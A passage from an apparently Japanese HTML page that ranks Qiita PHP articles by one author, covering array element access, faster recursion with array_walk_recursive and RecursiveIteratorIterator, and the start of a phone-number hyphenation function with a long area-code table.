<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span><span class="nb">key</span><span class="p">(</span><span class="nb">array_slice</span><span class="p">(</span><span class="nv">$arr</span><span class="p">,</span> <span class="nv">$n</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">true</span><span class="p">)));</span>
</pre></div></div>

<h2>
<span id="n番目の値だけ欲しい場合" class="fragment"></span><a href="#n%E7%95%AA%E7%9B%AE%E3%81%AE%E5%80%A4%E3%81%A0%E3%81%91%E6%AC%B2%E3%81%97%E3%81%84%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a><code>$n</code>番目の値だけ欲しい場合</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span><span class="nb">current</span><span class="p">(</span><span class="nb">array_slice</span><span class="p">(</span><span class="nv">$arr</span><span class="p">,</span> <span class="nv">$n</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">true</span><span class="p">)));</span>
</pre></div></div>

<h2>
<span id="先頭の値が欲しい場合内部ポインタを変更しても問題ない場合" class="fragment"></span><a href="#%E5%85%88%E9%A0%AD%E3%81%AE%E5%80%A4%E3%81%8C%E6%AC%B2%E3%81%97%E3%81%84%E5%A0%B4%E5%90%88%E5%86%85%E9%83%A8%E3%83%9D%E3%82%A4%E3%83%B3%E3%82%BF%E3%82%92%E5%A4%89%E6%9B%B4%E3%81%97%E3%81%A6%E3%82%82%E5%95%8F%E9%A1%8C%E3%81%AA%E3%81%84%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>先頭の値が欲しい場合(内部ポインタを変更しても問題ない場合)</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span><span class="nb">reset</span><span class="p">(</span><span class="nv">$arr</span><span class="p">));</span>
</pre></div></div>

<h2>
<span id="末尾の値が欲しい場合内部ポインタを変更しても問題ない場合" class="fragment"></span><a href="#%E6%9C%AB%E5%B0%BE%E3%81%AE%E5%80%A4%E3%81%8C%E6%AC%B2%E3%81%97%E3%81%84%E5%A0%B4%E5%90%88%E5%86%85%E9%83%A8%E3%83%9D%E3%82%A4%E3%83%B3%E3%82%BF%E3%82%92%E5%A4%89%E6%9B%B4%E3%81%97%E3%81%A6%E3%82%82%E5%95%8F%E9%A1%8C%E3%81%AA%E3%81%84%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>末尾の値が欲しい場合(内部ポインタを変更しても問題ない場合)</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span><span class="nb">end</span><span class="p">(</span><span class="nv">$arr</span><span class="p">));</span>
</pre></div></div>

<h1>
<span id="reset-や-end-などに変数じゃなくて値を使いたい" class="fragment"></span><a href="#reset-%E3%82%84-end-%E3%81%AA%E3%81%A9%E3%81%AB%E5%A4%89%E6%95%B0%E3%81%98%E3%82%83%E3%81%AA%E3%81%8F%E3%81%A6%E5%80%A4%E3%82%92%E4%BD%BF%E3%81%84%E3%81%9F%E3%81%84"><i class="fa fa-link"></i></a><code>reset()</code> や <code>end()</code> などに「変数」じゃなくて「値」を使いたい！</h1>

<p>そういうときは <code>call_user_func()</code> や <code>call_user_func_array()</code> を通せば大丈夫です。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span><span class="nb">call_user_func</span><span class="p">(</span><span class="s1">'reset'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span> <span class="s1">'b'</span><span class="p">,</span> <span class="s1">'c'</span><span class="p">)));</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />15位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>80</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/e640ffdc935b1d8c3b5f">PHPにおける再帰処理の高速化</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-08-23 06:20:47</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[再帰]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="鉄則-c言語レベルで再帰処理させろ" class="fragment"></span><a href="#%E9%89%84%E5%89%87-c%E8%A8%80%E8%AA%9E%E3%83%AC%E3%83%99%E3%83%AB%E3%81%A7%E5%86%8D%E5%B8%B0%E5%87%A6%E7%90%86%E3%81%95%E3%81%9B%E3%82%8D"><i class="fa fa-link"></i></a>鉄則： C言語レベルで再帰処理させろ！</h1>

<p>PHP言語レベルで再帰させるのとC言語レベルで再帰させるのでは、処理速度に雲泥の差がある。<br>
圧倒的にC言語レベルの方が高速。</p>

<h1>
<span id="よく使う関数クラス" class="fragment"></span><a href="#%E3%82%88%E3%81%8F%E4%BD%BF%E3%81%86%E9%96%A2%E6%95%B0%E3%82%AF%E3%83%A9%E3%82%B9"><i class="fa fa-link"></i></a>よく使う関数・クラス</h1>

<p>以下の関数やクラスを使えば、配列の要素を辿っていく再帰処理であっても、<br>
葉ノードだけを (PHP言語レベルでは) <strong>単一のループ</strong> で処理させることが可能。</p>

<h2>
<span id="array_walk_recursive" class="fragment"></span><a href="#array_walk_recursive"><i class="fa fa-link"></i></a><code>array_walk_recursive()</code>
</h2>

<p><a href="http://php.net/manual/ja/function.array-walk-recursive.php" class="autolink" rel="nofollow noopener" target="_blank">http://php.net/manual/ja/function.array-walk-recursive.php</a><br>
最速。</p>

<h2>
<span id="recursiveiteratoriterator" class="fragment"></span><a href="#recursiveiteratoriterator"><i class="fa fa-link"></i></a><code>RecursiveIteratorIterator</code>
</h2>

<p><a href="http://www.php.net/manual/ja/recursiveiteratoriterator.construct.php" class="autolink" rel="nofollow noopener" target="_blank">http://www.php.net/manual/ja/recursiveiteratoriterator.construct.php</a><br>
<code>array_walk_recursive()</code>より速度的には僅かに劣るが、こちらにしか出来ないこともある。</p>

<blockquote>
<ul>
<li>
<strong><code>RecursiveIteratorIterator::LEAVES_ONLY</code></strong><br>
デフォルト。イテレーションで葉ノードだけを取り上げます。</li>
<li>
<strong><code>RecursiveIteratorIterator::SELF_FIRST</code></strong><br>
イテレーションで葉と親を (親から先に) 取り上げます。</li>
<li>
<strong><code>RecursiveIteratorIterator::CHILD_FIRST</code></strong><br>
イテレーションで葉と親を (葉から先に) 取り上げます。</li>
</ul>
</blockquote>

<p>このようにモードを切り替えることが可能。<br>
更に、 <strong><code>RecursiveArrayIterator</code></strong> 以外にも</p>

<ul>
<li><strong><code>RecursiveDirectoryIterator</code></strong></li>
<li><code>RecursiveCachingIterator</code></li>
<li><code>RecursiveCallbackFilterIterator</code></li>
<li><code>RecursiveFilterIterator</code></li>
<li><code>RecursiveRegexIterator</code></li>
<li><code>RecursiveTreeIterator</code></li>
</ul>

<p>と併せて使うことが可能。</p>

<h1>
<span id="応用例" class="fragment"></span><a href="#%E5%BF%9C%E7%94%A8%E4%BE%8B"><i class="fa fa-link"></i></a>応用例</h1>

<h2>
<span id="array_map_recursive" class="fragment"></span><a href="#array_map_recursive"><i class="fa fa-link"></i></a><code>array_map_recursive()</code>
</h2>

<p><code>array_map()</code>みたいに複数の配列引数は受け付けないけど。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHP5.3の場合はcallableタイプヒンティング消してください</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">array_map_recursive</span><span class="p">(</span><span class="nx">callable</span> <span class="nv">$func</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$arr</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">array_walk_recursive</span><span class="p">(</span><span class="nv">$arr</span><span class="p">,</span> <span class="k">function</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$v</span><span class="p">)</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$func</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
    <span class="p">});</span>
    <span class="k">return</span> <span class="nv">$arr</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<p><strong>追加記事: <a href="http://qiita.com/mpyw/items/2967ea1e36a144f76587" id="reference-077ed42c75e2fa1ecb98">array_map_recursiveはPHPに標準実装されていた！</a></strong> もご覧ください。</p>

<h2>
<span id="array_flatten" class="fragment"></span><a href="#array_flatten"><i class="fa fa-link"></i></a><code>array_flatten()</code>
</h2>

<p>葉要素だけを取り出して1次元の配列にする。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">array_flatten</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="nb">array_walk_recursive</span><span class="p">(</span><span class="nv">$arr</span><span class="p">,</span> <span class="k">function</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="k">use</span> <span class="p">(</span><span class="o">&amp;</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$ret</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span>
    <span class="p">});</span>
    <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<h2>
<span id="dirsize" class="fragment"></span><a href="#dirsize"><i class="fa fa-link"></i></a><code>dirsize()</code>
</h2>

<p>指定したディレクトリのサイズを取得する。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">dirsize</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$sum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="k">new</span> <span class="nx">RecursiveIteratorIterator</span><span class="p">(</span>
        <span class="k">new</span> <span class="nx">RecursiveDirectoryIterator</span><span class="p">(</span>
            <span class="nv">$dir</span><span class="p">,</span>
            <span class="nx">FileSystemIterator</span><span class="o">::</span><span class="na">SKIP_DOTS</span>
        <span class="p">)</span>
    <span class="p">)</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$item</span><span class="o">-&gt;</span><span class="na">isFile</span><span class="p">())</span> <span class="p">{</span>
            <span class="nv">$sum</span> <span class="o">+=</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">getSize</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$sum</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<h2>
<span id="scan_image" class="fragment"></span><a href="#scan_image"><i class="fa fa-link"></i></a><code>scan_image()</code>
</h2>

<p>指定したディレクトリ下にあるGIF/JPEG/PNG画像へのパスを再帰的に取得する。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">scan_image</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="k">new</span> <span class="nx">RecursiveIteratorIterator</span><span class="p">(</span>
        <span class="k">new</span> <span class="nx">RecursiveDirectoryIterator</span><span class="p">(</span>
            <span class="nv">$dir</span><span class="p">,</span>
            <span class="nx">FileSystemIterator</span><span class="o">::</span><span class="na">SKIP_DOTS</span>
        <span class="p">)</span>
    <span class="p">)</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span> <span class="o">!</span><span class="nv">$item</span><span class="o">-&gt;</span><span class="na">isFile</span><span class="p">()</span><span class="o">:</span>
            <span class="k">case</span> <span class="p">(</span><span class="nv">$info</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$path</span> <span class="o">=</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">getPathname</span><span class="p">()))</span> <span class="o">===</span> <span class="k">false</span><span class="o">:</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">'mime'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'image/gif'</span><span class="o">:</span>
            <span class="k">case</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">'mime'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'image/jpeg'</span><span class="o">:</span>
            <span class="k">case</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">'mime'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'image/png'</span><span class="o">:</span>
                <span class="nv">$ret</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$path</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />16位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>79</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/431c0c8cb70084a74be5">[PHP] ハイフンなしの電話番号からハイフン付き電話番号を復元する</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-09-10 20:52:14</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>Rubyですでに実践されているコードがあったのでそちらを参考にさせていただきつつ少々工夫してみました。<br>
<a href="http://qiita.com/kennyj@github/items/dde3880abb5071f649ab" class="autolink" id="reference-c5928ae8c0786f94d6c7">http://qiita.com/kennyj@github/items/dde3880abb5071f649ab</a><br>
<a href="https://gist.github.com/kennyj/4966002" class="autolink" rel="nofollow noopener" target="_blank">https://gist.github.com/kennyj/4966002</a></p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">使い方</span></div>
<div class="highlight"><pre><span></span><span class="k">echo</span> <span class="nx">format_phone_number</span><span class="p">(</span><span class="s1">'0120828828'</span><span class="p">);</span> <span class="c1">// 0120-828-828</span>
</pre></div>
</div>

<p>既にハイフンで誤って区切られていた場合も正しく修正されます。<br>
一覧の中から見つからなかったときはそのまま <strong><em><code>$input</code></em></strong> を返します。<br>
第2引数の <strong><em><code>$strict</code></em></strong> で携帯電話等の番号の区切り方が変わります。</p>

<h4>
<span id="strict-がfalseデフォルトのとき" class="fragment"></span><a href="#strict-%E3%81%8Cfalse%E3%83%87%E3%83%95%E3%82%A9%E3%83%AB%E3%83%88%E3%81%AE%E3%81%A8%E3%81%8D"><i class="fa fa-link"></i></a><em>$strict</em> がFALSE(デフォルト)のとき</h4>

<p>見慣れた慣用的な区切りになります。<br>
090 - XXXX - YYYY<br>
080 - XXXX - YYYY<br>
070 - XXXX - YYYY<br>
020 - XXXX - YYYY</p>

<h4>
<span id="strict-がtrueのとき" class="fragment"></span><a href="#strict-%E3%81%8Ctrue%E3%81%AE%E3%81%A8%E3%81%8D"><i class="fa fa-link"></i></a><em>$strict</em> がTRUEのとき</h4>

<p>総務省の資料に厳格に従います。<br>
090 - XXX - YYYYY<br>
080 - XXX - YYYYY<br>
070 - XXX - YYYYY<br>
020 - XXX - YYYYY</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">関数定義</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">format_phone_number</span><span class="p">(</span><span class="nv">$input</span><span class="p">,</span> <span class="nv">$strict</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$groups</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="mi">5</span> <span class="o">=&gt;</span> 
        <span class="k">array</span> <span class="p">(</span>
            <span class="s1">'01564'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01558'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01586'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01587'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01634'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01632'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01547'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'05769'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'04992'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'04994'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01456'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01457'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01466'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01635'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'09496'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'08477'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'08512'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'08396'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'08388'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'08387'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'08514'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'07468'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01655'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01648'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01656'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01658'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'05979'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'04996'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01654'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01372'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01374'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'09969'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'09802'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'09912'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'09913'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01398'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01377'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01267'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'04998'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01397'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'01392'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
        <span class="p">),</span>
        <span class="mi">4</span> <span class="o">=&gt;</span> 
        <span class="k">array</span> <span class="p">(</span>
            <span class="s1">'0768'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0770'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0772'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0774'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0773'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0767'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0771'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0765'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0748'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0747'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0746'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0826'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0749'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0776'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0763'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0761'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0766'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0778'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0824'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0797'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0796'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0555'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0823'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0798'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0554'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0820'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0795'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0556'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0791'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0790'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0779'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0558'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0745'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0794'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0557'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0799'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0738'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0567'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0568'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0585'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0586'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0566'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0564'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0565'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0587'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0584'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0581'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0572'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0574'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0573'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0575'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0576'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0578'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0577'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0569'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0594'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0827'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0736'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0735'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0725'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0737'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0739'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0743'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0742'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0740'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0721'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0599'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0561'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0562'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0563'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0595'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0596'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0598'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0597'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0744'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0852'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0956'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0955'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0954'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0952'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0957'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
